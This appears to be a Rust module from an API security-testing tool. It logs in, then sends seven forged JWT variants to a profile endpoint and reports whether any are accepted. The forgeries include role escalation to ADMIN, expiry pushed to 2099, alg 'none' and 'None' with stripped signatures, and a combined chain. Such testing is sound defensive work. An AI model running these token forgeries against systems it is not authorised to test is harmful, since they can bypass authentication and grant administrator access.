use crate::event::GraphEvent;
use crate::client::ApiClient;
use serde::Serialize;
use serde_json::Value;

// ── Report structures ────────────────────────────

#[derive(Serialize)]
pub struct JwtTamperReport {
    pub attack: String,
    pub timestamp: String,
    pub original_valid: bool,
    pub tampered_accepted: bool,
    pub test_cases: Vec<JwtTamperCase>,
    pub summary: TestSummary,
    pub verdict: String,
}

#[derive(Serialize)]
pub struct JwtTamperCase {
    pub name: String,
    pub description: String,
    pub severity: String,
    pub tampered_token: String,
    pub response_status: u16,
    pub response_code: String,
    pub reason: String,
    pub accepted: bool,
    pub detail: String,
}

#[derive(Serialize)]
pub struct TestSummary {
    pub total: usize,
    pub passed: usize,
    pub failed: usize,
    pub critical_findings: usize,
    pub high_findings: usize,
}

// ── Severity assignment ──────────────────────────

fn severity_for(test_name: &str, accepted: bool) -> &'static str {
    if !accepted {
        return "NONE";
    }
    match test_name {
        "role_escalation"
        | "role_escalation_alg_none"
        | "alg_none"
        | "alg_None_variant" => "CRITICAL",

        "expiry_bypass" => "HIGH",

        "empty_signature"
        | "corrupted_signature" => "MEDIUM",

        _ => "MEDIUM",
    }
}

// ── Reason classification ────────────────────────

fn classify_reason(status: u16, code: &str) -> String {
    if status == 200 {
        return "ACCEPTED".into();
    }

    // Map backend error codes to attacker-visible reason
    match code {
        "SIGNATURE_INVALID"      => "SIGNATURE_INVALID".into(),
        "SIGNATURE_MISSING"      => "SIGNATURE_MISSING".into(),
        "TOKEN_EXPIRED"          => "TOKEN_EXPIRED".into(),
        "ALGORITHM_NOT_ALLOWED"  => "ALGORITHM_NOT_ALLOWED".into(),
        "TOKEN_INVALID"          => "TOKEN_INVALID".into(),
        "TOKEN_MALFORMED"        => "TOKEN_MALFORMED".into(),
        "AUTH_REQUIRED"          => "UNAUTHORIZED".into(),
        "SESSION_REVOKED"        => "SESSION_REVOKED".into(),
        _ if status == 401       => "UNAUTHORIZED".into(),
        _ if status == 403       => "FORBIDDEN".into(),
        _                        => "UNKNOWN".into(),
    }
}

// ── Attack entry point ───────────────────────────

pub async fn run(
    client: &ApiClient,
    email: &str,
    password: &str,
    user_id: &str,
    correlation_id: &str,
) -> Result<(JwtTamperReport, GraphEvent), String> {

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    //  PHASE 1 — Obtain a legitimate JWT
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    println!("[JWT] Phase 1: Authenticating to obtain valid JWT");

    let login = client.login(email, password).await
        .map_err(|e| format!("login failed: {}", e))?;

    let original_token = &login.access_token;
    if original_token.is_empty() {
        return Err("login returned empty access_token".into());
    }

    println!("[JWT]   Token obtained ({} chars)", original_token.len());

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    //  PHASE 2 — Validate original token works
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    println!("[JWT] Phase 2: Verifying original token is accepted");

    let baseline = client
        .get_authenticated("/api/v1/auth/profile", original_token)
        .await;

    let original_valid = baseline.status == 200;
    println!("[JWT]   Baseline: status={} valid={}", baseline.status, original_valid);

    if !original_valid {
        return Err(format!(
            "original token rejected (status {}), cannot proceed with tampering tests",
            baseline.status
        ));
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    //  PHASE 3 — Decode JWT parts
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    println!("[JWT] Phase 3: Decoding JWT structure");

    let parts: Vec<&str> = original_token.splitn(3, '.').collect();
    if parts.len() != 3 {
        return Err(format!("JWT does not have 3 parts (found {})", parts.len()));
    }

    let header_b64 = parts[0];
    let payload_b64 = parts[1];
    let signature_b64 = parts[2];

    let header_json = b64url_decode_json(header_b64)
        .map_err(|e| format!("failed to decode JWT header: {}", e))?;
    let payload_json = b64url_decode_json(payload_b64)
        .map_err(|e| format!("failed to decode JWT payload: {}", e))?;

    println!("[JWT]   Header : {}", serde_json::to_string(&header_json).unwrap_or_default());
    println!("[JWT]   Payload: alg={}, sub={}, role={}",
        header_json.get("alg").and_then(|v| v.as_str()).unwrap_or("?"),
        payload_json.get("sub").or_else(|| payload_json.get("userId"))
            .and_then(|v| v.as_str()).unwrap_or("?"),
        payload_json.get("role").and_then(|v| v.as_str()).unwrap_or("?"),
    );
    println!("[JWT]   Signature: {}… ({} chars)",
        &signature_b64[..signature_b64.len().min(16)],
        signature_b64.len()
    );

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    //  PHASE 4 — Tamper & Test
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    println!();
    println!("[JWT] Phase 4: Running JWT tampering test cases");

    let mut test_cases: Vec<JwtTamperCase> = Vec::new();

    // ── Test 1: Role Escalation (keep original signature) ───
    {
        let name = "role_escalation";
        println!("[JWT]   Test 1: {} — change role to ADMIN, keep signature", name);

        let mut modified_payload = payload_json.clone();
        modified_payload["role"] = serde_json::json!("ADMIN");

        let new_payload_b64 = b64url_encode_json(&modified_payload);
        let tampered = format!("{}.{}.{}", header_b64, new_payload_b64, signature_b64);

        let r = client.get_authenticated("/api/v1/auth/profile", &tampered).await;
        let accepted = r.status == 200;
        let reason = classify_reason(r.status, &r.code);
        let severity = severity_for(name, accepted);

        println!("[JWT]     → status={} accepted={} reason={} severity={}", r.status, accepted, reason, severity);

        test_cases.push(JwtTamperCase {
            name: name.into(),
            description: "Modified role claim to ADMIN, retained original signature".into(),
            severity: severity.into(),
            tampered_token: mask_token(&tampered),
            response_status: r.status,
            response_code: r.code,
            reason,
            accepted,
            detail: summarize_body(&r.body),
        });
    }

    // ── Test 2: Expiry Bypass (keep original signature) ─────
    {
        let name = "expiry_bypass";
        println!("[JWT]   Test 2: {} — set exp to year 2099, keep signature", name);

        let mut modified_payload = payload_json.clone();
        // 2099-01-01T00:00:00Z = 4_070_908_800
        modified_payload["exp"] = serde_json::json!(4_070_908_800_u64);

        let new_payload_b64 = b64url_encode_json(&modified_payload);
        let tampered = format!("{}.{}.{}", header_b64, new_payload_b64, signature_b64);

        let r = client.get_authenticated("/api/v1/auth/profile", &tampered).await;
        let accepted = r.status == 200;
        let reason = classify_reason(r.status, &r.code);
        let severity = severity_for(name, accepted);

        println!("[JWT]     → status={} accepted={} reason={} severity={}", r.status, accepted, reason, severity);

        test_cases.push(JwtTamperCase {
            name: name.into(),
            description: "Extended expiry to year 2099, retained original signature".into(),
            severity: severity.into(),
            tampered_token: mask_token(&tampered),
            response_status: r.status,
            response_code: r.code,
            reason,
            accepted,
            detail: summarize_body(&r.body),
        });
    }

    // ── Test 3: alg=none (remove signature entirely) ────────
    {
        let name = "alg_none";
        println!("[JWT]   Test 3: {} — set alg to 'none', strip signature", name);

        let mut modified_header = header_json.clone();
        modified_header["alg"] = serde_json::json!("none");

        let new_header_b64 = b64url_encode_json(&modified_header);
        // alg=none attack: empty signature segment
        let tampered = format!("{}.{}.", new_header_b64, payload_b64);

        let r = client.get_authenticated("/api/v1/auth/profile", &tampered).await;
        let accepted = r.status == 200;
        let reason = classify_reason(r.status, &r.code);
        let severity = severity_for(name, accepted);

        println!("[JWT]     → status={} accepted={} reason={} severity={}", r.status, accepted, reason, severity);

        test_cases.push(JwtTamperCase {
            name: name.into(),
            description: "Set header alg to 'none' and stripped signature (CVE-2015-9235 style)".into(),
            severity: severity.into(),
            tampered_token: mask_token(&tampered),
            response_status: r.status,
            response_code: r.code,
            reason,
            accepted,
            detail: summarize_body(&r.body),
        });
    }

    // ── Test 4: alg=None variant (capital N) ────────────────
    {
        let name = "alg_None_variant";
        println!("[JWT]   Test 4: {} — set alg to 'None' (case variation), strip signature", name);

        let mut modified_header = header_json.clone();
        modified_header["alg"] = serde_json::json!("None");

        let new_header_b64 = b64url_encode_json(&modified_header);
        let tampered = format!("{}.{}.", new_header_b64, payload_b64);

        let r = client.get_authenticated("/api/v1/auth/profile", &tampered).await;
        let accepted = r.status == 200;
        let reason = classify_reason(r.status, &r.code);
        let severity = severity_for(name, accepted);

        println!("[JWT]     → status={} accepted={} reason={} severity={}", r.status, accepted, reason, severity);

        test_cases.push(JwtTamperCase {
            name: name.into(),
            description: "Set header alg to 'None' (case variant) and stripped signature".into(),
            severity: severity.into(),
            tampered_token: mask_token(&tampered),
            response_status: r.status,
            response_code: r.code,
            reason,
            accepted,
            detail: summarize_body(&r.body),
        });
    }

    // ── Test 5: Empty signature (keep valid alg) ────────────
    {
        let name = "empty_signature";
        println!("[JWT]   Test 5: {} — keep original header+payload, empty signature", name);

        let tampered = format!("{}.{}.", header_b64, payload_b64);

        let r = client.get_authenticated("/api/v1/auth/profile", &tampered).await;
        let accepted = r.status == 200;
        let reason = classify_reason(r.status, &r.code);
        let severity = severity_for(name, accepted);

        println!("[JWT]     → status={} accepted={} reason={} severity={}", r.status, accepted, reason, severity);

        test_cases.push(JwtTamperCase {
            name: name.into(),
            description: "Original header and payload but with empty signature segment".into(),
            severity: severity.into(),
            tampered_token: mask_token(&tampered),
            response_status: r.status,
            response_code: r.code,
            reason,
            accepted,
            detail: summarize_body(&r.body),
        });
    }

    // ── Test 6: Corrupted signature ─────────────────────────
    {
        let name = "corrupted_signature";
        println!("[JWT]   Test 6: {} — flip bits in signature", name);

        let corrupted_sig = corrupt_b64(signature_b64);
        let tampered = format!("{}.{}.{}", header_b64, payload_b64, corrupted_sig);

        let r = client.get_authenticated("/api/v1/auth/profile", &tampered).await;
        let accepted = r.status == 200;
        let reason = classify_reason(r.status, &r.code);
        let severity = severity_for(name, accepted);

        println!("[JWT]     → status={} accepted={} reason={} severity={}", r.status, accepted, reason, severity);

        test_cases.push(JwtTamperCase {
            name: name.into(),
            description: "Original header+payload with randomly corrupted signature bytes".into(),
            severity: severity.into(),
            tampered_token: mask_token(&tampered),
            response_status: r.status,
            response_code: r.code,
            reason,
            accepted,
            detail: summarize_body(&r.body),
        });
    }

    // ── Test 7: Role escalation + alg=none combo ────────────
    {
        let name = "role_escalation_alg_none";
        println!("[JWT]   Test 7: {} — ADMIN role + alg=none (full attack chain)", name);

        let mut modified_header = header_json.clone();
        modified_header["alg"] = serde_json::json!("none");

        let mut modified_payload = payload_json.clone();
        modified_payload["role"] = serde_json::json!("ADMIN");
        modified_payload["exp"] = serde_json::json!(4_070_908_800_u64);

        let new_header_b64 = b64url_encode_json(&modified_header);
        let new_payload_b64 = b64url_encode_json(&modified_payload);
        let tampered = format!("{}.{}.", new_header_b64, new_payload_b64);

        let r = client.get_authenticated("/api/v1/auth/profile", &tampered).await;
        let accepted = r.status == 200;
        let reason = classify_reason(r.status, &r.code);
        let severity = severity_for(name, accepted);

        println!("[JWT]     → status={} accepted={} reason={} severity={}", r.status, accepted, reason, severity);

        test_cases.push(JwtTamperCase {
            name: name.into(),
            description: "Combined: role→ADMIN + exp→2099 + alg→none (full exploit chain)".into(),
            severity: severity.into(),
            tampered_token: mask_token(&tampered),
            response_status: r.status,
            response_code: r.code,
            reason,
            accepted,
            detail: summarize_body(&r.body),
        });
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    //  SUMMARY & VERDICT
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    let total = test_cases.len();
    let failed = test_cases.iter().filter(|t| t.accepted).count();
    let passed = total - failed;
    let critical_findings = test_cases.iter()
        .filter(|t| t.severity == "CRITICAL")
        .count();
    let high_findings = test_cases.iter()
        .filter(|t| t.severity == "HIGH")
        .count();

    let tampered_accepted = failed > 0;

    let verdict = if critical_findings > 0 {
        "CRITICAL"
    } else if high_findings > 0 {
        "VULNERABLE"
    } else if tampered_accepted {
        "VULNERABLE"
    } else {
        "SECURE"
    };

    let summary = TestSummary {
        total,
        passed,
        failed,
        critical_findings,
        high_findings,
    };

    // ── Console output ──────────────────────────────────────

    println!();
    println!("[JWT] ═══════════════════════════════════════════");
    println!("[JWT] Summary: {}/{} tests passed ({} rejected tampering)",
        passed, total, passed);
    println!("[JWT]   Critical findings: {}", critical_findings);
    println!("[JWT]   High findings    : {}", high_findings);
    println!("[JWT]   Failed (accepted): {}", failed);

    if tampered_accepted {
        println!("[JWT]");
        for t in test_cases.iter().filter(|t| t.accepted) {
            println!("[JWT]   🚨 {} → status {} [{}]", t.name, t.response_status, t.severity);
        }
    } else {
        println!("[JWT]   ✅ All tampered tokens correctly rejected");
        println!("[JWT]");
        println!("[JWT]   Rejection reasons:");
        for t in &test_cases {
            println!("[JWT]     {} → {} ({})", t.name, t.reason, t.response_status);
        }
    }

    println!("[JWT] Verdict: {}", verdict);

    let report = JwtTamperReport {
        attack: "jwt_tampering_signature_validation".into(),
        timestamp: chrono::Utc::now().to_rfc3339(),
        original_valid,
        tampered_accepted,
        test_cases,
        summary,
        verdict: verdict.into(),
    };

    let event = GraphEvent::new(
        correlation_id,
        user_id,
        Some(email.to_string()),
        "JWT_TAMPER",
        "/api/v1/auth/profile",
        &report.verdict,
    );

    Ok((report, event))
}

// ── Base64url helpers (no padding) ───────────────

/// Decode base64url → JSON Value
fn b64url_decode_json(input: &str) -> Result<Value, String> {
    let bytes = b64url_decode(input)?;
    let text = String::from_utf8(bytes)
        .map_err(|e| format!("invalid UTF-8: {}", e))?;
    serde_json::from_str(&text)
        .map_err(|e| format!("invalid JSON: {}", e))
}

/// Raw base64url decode (handles missing padding)
fn b64url_decode(input: &str) -> Result<Vec<u8>, String> {
    // Convert base64url to standard base64
    let mut b64 = input.replace('-', "+").replace('_', "/");

    // Add padding if needed
    let pad = (4 - b64.len() % 4) % 4;
    for _ in 0..pad {
        b64.push('=');
    }

    data_encoding::BASE64.decode(b64.as_bytes())
        .map_err(|e| format!("base64 decode error: {}", e))
}

/// Encode JSON Value → base64url (no padding)
fn b64url_encode_json(value: &Value) -> String {
    let json_bytes = serde_json::to_vec(value).unwrap_or_default();
    b64url_encode(&json_bytes)
}

/// Raw base64url encode (no padding)
fn b64url_encode(data: &[u8]) -> String {
    data_encoding::BASE64URL_NOPAD.encode(data)
}

/// Corrupt a base64url string by flipping characters
fn corrupt_b64(input: &str) -> String {
    let mut chars: Vec<char> = input.chars().collect();
    // Flip several characters to guarantee invalidation
    let positions = [0, chars.len() / 4, chars.len() / 2, 3 * chars.len() / 4];
    for &pos in &positions {
        if pos < chars.len() {
            chars[pos] = match chars[pos] {
                'A'..='Y' => ((chars[pos] as u8) + 1) as char,
                'Z' => 'A',
                'a'..='y' => ((chars[pos] as u8) + 1) as char,
                'z' => 'a',
                '0'..='8' => ((chars[pos] as u8) + 1) as char,
                '9' => '0',
                '-' => '_',
                '_' => '-',
                _ => 'X',
            };
        }
    }
    chars.into_iter().collect()
}

/// Mask a token for report output (show first/last 8 chars)
fn mask_token(token: &str) -> String {
    if token.len() <= 24 {
        return "***".to_string();
    }
    format!("{}…{}", &token[..8], &token[token.len()-8..])
}

/// Summarize a response body for the report (truncated).
fn summarize_body(body: &Value) -> String {
    let s = serde_json::to_string(body).unwrap_or_default();
    if s.len() > 200 {
        format!("{}…", &s[..200])
    } else {
        s
    }
}
